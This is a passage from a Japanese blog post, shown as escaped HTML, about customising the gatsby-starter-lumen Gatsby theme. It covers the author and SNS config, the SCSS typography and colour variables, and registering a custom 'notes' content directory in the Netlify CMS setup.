      &lt;span class=&quot;token literal-property property&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;Development&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token literal-property property&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;/tag/development&apos;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;token literal-property property&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;Notes&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token literal-property property&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;/category/note&apos;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token literal-property property&quot;&gt;author&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token literal-property property&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;かしわば&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token literal-property property&quot;&gt;photo&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;/avatar.png&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token literal-property property&quot;&gt;bio&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;リバースエンジニアになりたい趣味プログラマ。&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token literal-property property&quot;&gt;contacts&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;token literal-property property&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token literal-property property&quot;&gt;facebook&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token literal-property property&quot;&gt;telegram&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token literal-property property&quot;&gt;twitter&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;yuki_kashiwaba&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token literal-property property&quot;&gt;github&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;kash1064&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token literal-property property&quot;&gt;rss&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token literal-property property&quot;&gt;vkontakte&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token literal-property property&quot;&gt;linkedin&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token literal-property property&quot;&gt;instagram&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token literal-property property&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token literal-property property&quot;&gt;gitlab&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token literal-property property&quot;&gt;weibo&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token literal-property property&quot;&gt;codepen&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token literal-property property&quot;&gt;youtube&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token literal-property property&quot;&gt;soundcloud&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token literal-property property&quot;&gt;medium&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;特に&lt;code class=&quot;language-text&quot;&gt;contacts&lt;/code&gt;内のSNSアカウントについて、表示したくないものはコメントアウトではなく空欄にする必要があります。&lt;/p&gt;
&lt;p&gt;コメントアウトするとエラーが発生します。&lt;/p&gt;
&lt;h3 id=&quot;サイトデザインの設定&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%B5%E3%82%A4%E3%83%88%E3%83%87%E3%82%B6%E3%82%A4%E3%83%B3%E3%81%AE%E8%A8%AD%E5%AE%9A&quot; aria-label=&quot;サイトデザインの設定 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;サイトデザインの設定&lt;/h3&gt;
&lt;p&gt;サイトデザインを変更する場合は、各要素のテンプレートをそれぞれ編集する必要があります。&lt;/p&gt;
&lt;p&gt;今回はベースのレイアウトは変更せず、配色などを一部変更しました。&lt;/p&gt;
&lt;p&gt;基本のデザインを変更したい場合は&lt;code class=&quot;language-text&quot;&gt;blog/src/assets/scss/base/_generic.scss&lt;/code&gt;を編集します。&lt;/p&gt;
&lt;p&gt;内容は以下のようになっており、各要素の文字サイズや色、フォントなども変更することができます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;css&quot;&gt;&lt;pre class=&quot;language-css&quot;&gt;&lt;code class=&quot;language-css&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;/** 
 * Generic
 */&lt;/span&gt;
&lt;span class=&quot;token selector&quot;&gt;html&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; $typographic-root-font-size&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token selector&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;margin&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 0 0 0 &lt;span class=&quot;token function&quot;&gt;calc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;100vw - 100%&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; $typographic-font-family&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; $typographic-base-font-color&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;line-height&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; $typographic-base-line-height&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; $typographic-base-font-size&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;-ms-text-size-adjust&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 100%&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;-webkit-text-size-adjust&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 100%&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;text-rendering&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; optimizeLegibility&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;-webkit-font-smoothing&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; antialiased&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;-moz-osx-font-smoothing&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; grayscale&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token selector&quot;&gt;h1,
h2,
h3,
h4,
h5,
h6&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; $typographic-font-family&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;font-weight&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 600&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token selector&quot;&gt;h1&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; $typographic-base-font-size * 1.8&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token atrule&quot;&gt;&lt;span class=&quot;token rule&quot;&gt;@include&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;line-height&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;1.8&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token atrule&quot;&gt;&lt;span class=&quot;token rule&quot;&gt;@include&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;margin-top&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;4&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token atrule&quot;&gt;&lt;span class=&quot;token rule&quot;&gt;@include&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;margin-bottom&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token selector&quot;&gt;h2&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; $typographic-base-font-size * 1.6875&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token atrule&quot;&gt;&lt;span class=&quot;token rule&quot;&gt;@include&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;line-height&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;1.5&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token atrule&quot;&gt;&lt;span class=&quot;token rule&quot;&gt;@include&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;margin-top&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;2&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token atrule&quot;&gt;&lt;span class=&quot;token rule&quot;&gt;@include&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;margin-bottom&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;.5&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token selector&quot;&gt;h3&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; $typographic-base-font-size * 1.375&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token atrule&quot;&gt;&lt;span class=&quot;token rule&quot;&gt;@include&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;line-height&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token atrule&quot;&gt;&lt;span class=&quot;token rule&quot;&gt;@include&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;margin-top&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;2&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token atrule&quot;&gt;&lt;span class=&quot;token rule&quot;&gt;@include&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;margin-bottom&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;.5&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; 省略 &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;また、リンクの色や一部の要素のサイズなどは&lt;code class=&quot;language-text&quot;&gt;blog/src/assets/scss/_variables.scss&lt;/code&gt;で定義されている変数にて設定されています。&lt;/p&gt;
&lt;p&gt;例えばリンクの色を変更したい場合は、&lt;code class=&quot;language-text&quot;&gt;$color-primary&lt;/code&gt;を変更する必要があります。&lt;/p&gt;
&lt;p&gt;コンテンツの最大幅は&lt;code class=&quot;language-text&quot;&gt;$layout-post-single-width&lt;/code&gt;で設定されています。&lt;/p&gt;
&lt;p&gt;そのため、僕のブログでも以下のようにベースカラーを一部変更しています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;css&quot;&gt;&lt;pre class=&quot;language-css&quot;&gt;&lt;code class=&quot;language-css&quot;&gt;// Colors
$&lt;span class=&quot;token property&quot;&gt;color-base&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; #222&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
$&lt;span class=&quot;token property&quot;&gt;color-primary&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; #918D40&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
$&lt;span class=&quot;token property&quot;&gt;color-secondary&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; #A9D159&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

$&lt;span class=&quot;token property&quot;&gt;color-white&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; #FFF&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
$&lt;span class=&quot;token property&quot;&gt;color-gray&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;lighten&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;$color-base&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; 40%&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
$&lt;span class=&quot;token property&quot;&gt;color-gray-border&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;lighten&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;$color-base&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; 77%&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
$&lt;span class=&quot;token property&quot;&gt;color-gray-bg&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;lighten&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;$color-base&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; 79%&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;コンテンツを追加編集する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%B3%E3%83%B3%E3%83%86%E3%83%B3%E3%83%84%E3%82%92%E8%BF%BD%E5%8A%A0%E7%B7%A8%E9%9B%86%E3%81%99%E3%82%8B&quot; aria-label=&quot;コンテンツを追加編集する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;コンテンツを追加、編集する&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;gatsby-starter-lumen&lt;/code&gt;を使用する場合、デフォルトでは以下の2タイプのコンテンツが用意されています。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Pages：Aboutページなどの固定ページ&lt;/li&gt;
&lt;li&gt;Posts：ブログコンテンツ&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;これらはいずれも&lt;code class=&quot;language-text&quot;&gt;blog/content/&lt;/code&gt;ディレクトリの配下に配置されています。&lt;/p&gt;
&lt;p&gt;Gatsbyは、&lt;code class=&quot;language-text&quot;&gt;blog/src/cms/index.js&lt;/code&gt;の定義に沿って&lt;code class=&quot;language-text&quot;&gt;blog/content/&lt;/code&gt;配下のファイルを探索し、指定された形式のページとして識別します。&lt;/p&gt;
&lt;p&gt;そのため、デフォルトではすべてのブログページは&lt;code class=&quot;language-text&quot;&gt;blog/content/posts&lt;/code&gt;配下に置かれている必要がありますが、ここに&lt;code class=&quot;language-text&quot;&gt;notes&lt;/code&gt;などのカスタムディレクトリを追加したい場合は、以下のように&lt;code class=&quot;language-text&quot;&gt;CMS.registerPreviewTemplate&lt;/code&gt;にてディレクトリ名とテンプレートを紐づける必要があります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// @flow strict&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;CMS&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;netlify-cms-app&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; PagePreview &lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;./preview-templates/page-preview&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; PostPreview &lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;./preview-templates/post-preview&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token constant&quot;&gt;CMS&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;registerPreviewTemplate&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;pages&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; PagePreview&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token constant&quot;&gt;CMS&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;registerPreviewTemplate&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;posts&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; PostPreview&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token constant&quot;&gt;CMS&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;registerPreviewTemplate&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;notes&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; PostPreview&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;記事のurlからディレクトリ名を削除する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E8%A8%98%E4%BA%8B%E3%81%AEurl%E3%81%8B%E3%82%89%E3%83%87%E3%82%A3%E3%83%AC%E3%82%AF%E3%83%88%E3%83%AA%E5%90%8D%E3%82%92%E5%89%8A%E9%99%A4%E3%81%99%E3%82%8B&quot; aria-label=&quot;記事のurlからディレクトリ名を削除する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 